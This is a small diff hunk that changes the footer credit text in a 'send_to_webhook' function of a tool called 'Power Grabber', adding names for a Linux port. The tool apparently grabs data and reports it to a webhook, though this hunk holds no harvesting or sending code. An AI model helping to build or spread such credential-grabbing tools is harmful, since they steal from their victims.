@@ -18,7 +18,7 @@ def send_to_webhook(content):
         "description": content,
         "color": 0x8B0000,
         "footer": {
-            "text": f"Power Grabber | Made by Powercascade and Taktikal.exe"
+            "text": f"Power Grabber | Made by Powercascade and Taktikal.exe | Ported to Linux by Dispnser and 473d"
         }
     }
     payload = {
